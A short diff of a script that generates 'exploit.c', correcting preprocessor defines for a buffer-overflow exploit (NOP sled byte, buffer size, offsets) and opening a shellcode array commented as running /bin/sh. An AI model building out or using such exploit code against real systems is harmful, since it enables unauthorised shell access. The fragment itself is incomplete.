@@ -33,9 +33,9 @@ cat <<EOS > "exploit.c"
 #define DEFAULT_BSIZE 800
 #define NOP 0x90
 
-#define STOP_ADDR = 560
-#define START_NOPS = 559
-#define START_SHELL_CODE = 720
+#define STOP_ADDR 560
+#define START_NOPS 559
+#define START_SHELL_CODE 720
 
 // Shellcode for exec of /bin/sh
 char shellcode[] =
